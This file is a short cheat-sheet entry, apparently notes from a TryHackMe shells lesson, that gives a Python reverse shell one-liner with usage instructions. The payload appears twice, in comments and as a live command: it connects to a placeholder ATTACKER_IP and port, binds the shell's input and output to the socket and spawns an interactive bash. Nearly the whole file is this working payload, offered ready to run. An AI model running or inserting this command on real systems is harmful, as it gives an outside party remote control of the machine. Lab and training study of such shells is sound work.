# Python Reverse Shell - Environment Variables
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run with: python3 -c '<command>'
#        (use python -c for Python 2)
#
#   export RHOST="ATTACKER_IP"; export RPORT=PORT; python3 -c \
#   'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
#
# Sets remote host and port as env vars, creates socket, duplicates fd for stdio, spawns PTY bash.

export RHOST="ATTACKER_IP"; export RPORT=PORT; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
